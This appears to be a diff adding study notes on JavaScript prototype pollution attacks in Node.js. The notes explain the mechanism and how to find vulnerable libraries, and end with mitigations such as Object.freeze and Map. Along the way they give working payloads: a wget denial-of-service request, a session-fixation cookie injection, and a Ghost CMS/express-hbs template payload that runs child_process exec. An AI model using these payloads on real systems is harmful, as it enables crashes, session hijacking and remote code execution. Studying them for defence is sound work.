@@ -1,0 +1,359 @@
+Prototype Pollution
+
+
+Adds an extension method to the prototype of base object like “Object”, “String” or “Function.
+-Originally a concept used in building (client-side) JavaScript libraries, but quickly considered a bad/insecure practice.
+	--see library prototype.js
+Attacker pollutes the prototype of base object with arbitrary value.
+-Useful for attacking node.js applications
+
+Instantiate an object:
+
+var obj = { };
+
+	--empty object declared is an object which has the constructor the function “Object” and the properties like “toString” are defined on the prototype of “Object”
+
+Construct a class:
+
+function MyClass() {
+
+}
+var inst = new MyClass();
+
+	--specific to JavaScript Classes are declared by a function, which is the function called to instantiate a class
+	--Full listing of methods included in a generic JavaScript object: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype
+
+Functions available on all the instances of “MyClass” are declared on the prototype. During this declaration, the prototype is modified at runtime.
+-By default, the program can at any point in time add, change or delete entry in the prototype of a class.
+In JavaScript there is no distinction between a property and an instance function. An instance function is a property for which it’s type is a function.
+
+MyClass.prototype.myFunction = function () {
+      return 42;
+};
+
+var inst = new MyClass();
+var theAnswer = inst.myFunction();
+
+In JavaScript a method is a class property of type function accessed in the same way as any other property.
+2 syntaxes to access properties in JavaScript: dot notation (obj.a) and square bracket notation (obj[“a”])
+
+var obj = { “a” : 1, “b” : function() { return 41; } };
+
+var name1 = “a”;
+obj.a // 1
+obj[“a”] // 1
+obj[name1] // 1
+
+var name2 = “b”;
+obj.b() // 41
+obj.b // function.
+obj[“b”] // function
+obj[name2] // function
+
+“Magic Properties”:
+-“constructor”
+“constructor” is a magic property that returns the function used to create the object
+	--on every constructor there is the property “prototype” which points to the prototype of the class
+
+function MyClass() {
+
+}
+
+MyClass.prototype.myFunc = function () {
+      return 7;
+}
+
+var inst = new MyClass();
+inst.constructor //  returns the function MyClass
+inst.constructor.prototype // returns the prototype of MyClass
+inst.constructor.prototype.myFunc() // returns 7
+
+-“__proto__”
+“__proto__” is a magic property that returns the “prototype” of the class of the object
+	--not standard in the JavaScript language, fully supported in the NodeJS environment
+-implemented as a getter/setter property which invokes getPrototypeOf/setPrototypeOf on read/write
+-assigning a new value to the property “__proto__” doesn’t shadow the inherited value defined on the prototype
+	--only way to shadow it involves using “Object.defineProperty”
+
+function MyClass() {
+
+}
+
+MyClass.prototype.myFunc = function () {
+      return 7;
+}
+
+var inst = new MyClass();
+inst.__proto__ // returns the prototype of MyClass
+inst.__proto__.myFunc() // returns 7
+inst.__proto__ = { “a” : “123” }; // changing the prototype at runtime.
+inst.hasOwnProperty(“__proto__”) // false. We haven’t redefined the
+property. It’s still the original getter/setter magic property.
+
+
+Identifying Vulnerable Libraries
+
+Prototype pollution starts with the fact the attacker has control over at least the parameter “a” and “value” of an expression, form:
+
+obj[a][b] = value
+
+-attacker can set “a” to “__proto__” and the property with the name defined by “b” will be defined on all existing object (of the class of “obj”) of the application with the value “value”
+
+obj[a][b][c] = value
+
+-attacker can set “a” to “constructor”, “b” to “prototype” and the property with the name defined by “c” will be defined on all existing object of the application with the value “value”
+
+	--first of these 2 forms is easier to work with, second form requires more complex object assignment
+
+-If the vulnerable object being polluted is not an instance of “Object”, move up the prototype chain by accessing the “__proto__” attribute of the prototype
+	--“inst.__proto__.__proto__” points to the prototype of “Object”
+
+
+three types of API that cane be exploited via prototype pollution:
+Object recursive merge
+-When the source object contains a property named “__proto__” defined with Object.defineProperty(), the condition that checks if “property exists and is an object on both the target and the source” will pass and the merge will recurse with the target being the prototype of “Object” and the source an “Object” defined by the attacker. Properties will then be copied on the prototype of “Object”.
+	--most common way this can happen is when user-input is parsed with “JSON.parse”
+
+merge (target, source)
+	foreach property of source
+		if property exists and is an object on both the target and the source
+			merge(target[property], source[property])
+		else
+			target[property] = source[property]
+
+Property definition by path
+-API to define property value on an object based on a supplied path
+	--usually meant to simplify value assignment on complex objects
+-If attacker can control the value of “path”, can then set value to “__proto__.myValue”. “myValue” will then be assigned to the prototype of the class of instantiated object.
+
+theFunction(object, path, value)
+
+Object clone
+-API that clone object when the API implements the clone as recursive merge on an empty object
+	--merge function must be affected by the issue
+
+function clone(obj) {
+	return merge({}, obj);
+}
+
+
+Discovering Vulnerable API/libraries
+
+-manual code review is good where possible, static analysis fails to readily identify and verify exploitable vulnerabilities
+
+-automated testing:
+1. Install the library to be tested with “npm”
+2. In JavaScript
+	a. “require” the library by its name
+	b. Recursively list all the function available.
+	c. For each identified function
+		i. Call the function with a signature that would pollute the prototype of “object” if the implementation would be vulnerable.
+		ii. Once the call is done, check if the side-effect occurred. If it did, mark the function as affected and clean the side-effect.
+
+
+Attacking vulnerable implementation
+
+Generic exploitation outside of denial-of-service attack depends on how the application works with its object
+	--need to find interesting usage of objects in the code
+
+prototype of “Object” is holds generic functions that are implicitly called for various operations
+-(toString(), valueOf())
+	--possible to overwrite those function with either a “String” or an “Object”, generically will render application unable to work properly
+	--most commonly: “toString” and/or “valueOf” function get corrupted, after which every subsequent request returns 5xx error
+
+Generic PoC:
+wget --header="Content-Type: application/javascript+json" --post-data='{"__proto__":{"toString":"666","valueOf":"Die Eier von Satan!"}}' http://localhost:3000/ -O - -q
+	
+For-Loop Pollution
+--added property are enumerable
+
+“for(var key in obj) { ... }” loop will now iterate an additional range item with “key” being to the property name that we polluted “Object” with
+
+-look for iterators that call dangerous API and pollute the prototype with values that trigger those API with arbitrary value(s)
+	--attacker does not necessarily need to trigger target iteration
+	--if iterable key containing payload is eventually reached, exploitation will be successful
+
+Example PoC:
+{“__proto__”:{“malice practice”:”echo heres to my sweet Satan > /tmp/yawriats”}}
+
+Property injection
+attacker-defined attribute will now exist on objects that haven’t explicitly defined it
+
+-e.g. polluting the key “cookie”, the value of “request.headers.cookie” will always start with the payload value that we have polluted with
+	--e.g. returning a cookie value globally to all responses will result in session fixation where all users authenticate for the same session (session fixation)
+
+Example Poc:
+{“__proto__”:{“cookie”:”sess=fixional_sess_id; garbage=happy-when-it-rains; garbage-2_0=”}}
+
+
+"Repairing" Vulnerable Application - Exploitation
+Injecting property on the prototype of Object often interrupts normal runtime execution.
+	--to mount a non-DoS exploit, figure ways to “repair” the application
+
+-Figure out why the application crash with the property we have.
+-Adding the correct property to fix the crash.
+-Test the fix with the newly found property.
+-Repeat until we can reach the point we want.
+
+Fixing undefined is not an object
+-occurs when the code attempts to read a property of the value “undefined”
+	Or
+-when the code executes something along the line of “obj.doesnotexist.doesnotexist” it will crash
+	--“Cannot read property 'XXXX' of undefined” commonly returned as error
+
+Example *fixed* PoC
+"meta": { "pagination": { "pages": "100" } }
+
+	--expression “result.meta.pagination.pages” now correctly evaluates
+
+Fixing infinite recursion
+-on polluting the prototype of Object with an object property, all objects that exists in the runtime then recur infinitely
+
+A payload:
+	Object.prototype.foo = {};
+where
+	var a = {};
+evaluates
+	a.foo === a.foo
+but also evaluates
+	a.foo.foo.foo.foo.foo.foo.foo === a.foo	
+
+	--creates infinite recursion when there’s a piece of code that iterates recursively on object
+
+To fix, define the value we pollute with an arbitrary default value for the property whose name is also the name of its parent property
+
+Example *fixed* PoC
+Object.prototype.foo = { “foo” : “” }
+a.foo.foo === “”
+
+Avoiding dead-end
+-crash will occur in locations where no property can be added to avoid the crash
+	--best approach: look at all the conditions that were taken until the crash, then find a condition where property can be modified so that the dead-end path is no longer taken.
+
+	
+Injecting Property To Execute Code
+
+Changing the rendered template
+	--Lazy-loading involves having a value being first undefined and then defining it when it’s accessed and undefined
+-if we pollute a property “_template”, the rendered template will always be the one of our choice as the lazy-loading routine will believe it has already been loaded
+
+Injected Property:
+
+"_template":"../../../current/node_modules/express-hbs/test/issues/23/emptyComment.hbs"
+
+	--example taken from Ghost CMS cve, whose package dependency express-hbs contains template emptyComment.hbs for unit testing
+	--easiest target templates to inject contain only partial invocation
+	--download all dependencies for vulnerable package via npm and recursively search codebase partially invoked template(s)
+
+Injecting code in the rendering engine
+
+Example rendering engine (handlebar.js) rendering over 3 stages:
+text template -> Object representation of the template -> JavaScript code
+
+An injected property (payload) [object representation (of template)]:
+-remember we want to escape into JavaScript code execution from an instance of a class representing a text template
+
+"program": {
+	"opcodes": [{
+		"opcode": "pushLiteral",
+		"args": ["1"]
+	}, {
+		"opcode": "appendEscaped",
+		"args": ["1"]
+	}],
+	"children": [],
+	"blockParams": "CODE GOES HERE"
+}
+
+-since the execution of the JavaScript payload is in an eval-like context, the “require” function is not directly accessible
+--“require” can, however, be accessed through “global.process.mainModule.constructor._load”
+
+{
+	"existingFunction": [{
+		"__proto__": {
+			"_template":"../../../current/node_modules/express-hbs/test/issues/23/emptyComment.hbs", "posts": {
+				"type": "browse"
+			},
+			"resource": "constructor",
+			"type": "constructor",
+			"program": {
+				"opcodes": [{
+					"opcode": "pushLiteral",
+					"args": ["1"]
+				}, {
+					"opcode": "appendEscaped",
+					"args": ["1"]
+				}],
+				"children": [],
+				"blockParams":"global.process.mainModule.constructor._load('child_process').exec('tool',function(){})"
+			},
+			"children": [{
+				"opcodes": ["666"],
+				"children": [],
+				"blockParams": 1
+			}],
+			"options": ";",
+			"meta": {
+				"pagination": {
+					"pages": "666"
+				}
+			}
+		}
+	}]
+}
+
+
+Build a more stable exploit?
+-can make the application come back to its original state after the payload was executed by deleting all the property we have added to the prototype of Object
+
+	"blockParams":global.process.mainModule.constructor._load('child_process').exec('tool', function(){})+eval(' for (var a in {}) { delete Object.prototype[a]; } ' )
+
+
+
+Mitigation
+
+-ECMAScript standard version 5 introduced functionality to allow definition of non-enumerable property, getter, setter, &c.
+	--introduced “Object.freeze” API
+	--when “Object.freeze” is called on an object further modification on that object will silently fail
+
+-Since the prototype of “Object” is an object, it’s possible to freeze it.
+	--Doing so will mitigate almost all exploitable cases.
+	--While adding function to the prototype of the base object is not considered a best practice, it may still be used in NodeJS applications or dependencies.
+	--Frozen objects silently failing on property assignation may introduce bugs without writing a warning to debugging error output (SILENTLY FAIL!).
+
+	mitigation.js
+Object.freeze(Object.prototype);
+Object.freeze(Object);
+({}).__proto__.test = 666
+({}).test // this will be undefined
+
+
+Schema validation of JSON input
+	--Several NPM libraries offer schema validation for JSON data, ensure that the JSON data contains all the expected attributes with the appropriate type.
+-in this mitigation approach unneeded attributes are rejected
+	--e.g. in imported NPM library 'avj' set “additionalProperties” to “false” on the schema
+	---https://epoberezkin.github.io/ajv
+
+
+Using Map instead of Object
+-Map primitive introduced in EcmaScript standard version 6
+	---https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map
+	--works as a HashMap, but without all the security caveats that Object have
+	--well supported in modern NodeJS environment and slowly coming to browser
+-Where a key/value structure is necessary, Map should be preferred to Object
+
+
+Object.create(null)
+-creates JavaScript object with no prototype
+	--requires “Object.create” function
+	--Object created through this API won’t have the “__proto__” and “constructor” attributes
+
+var obj = Object.create(null);
+obj.__proto__ // undefined
+obj.constructor // undefined
+
+
+
+https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf?raw=true
+https://www.reddit.com/r/programming/comments/7xxqx1/prototype_pollution_attack/
+https://hackerone.com/reports/310443
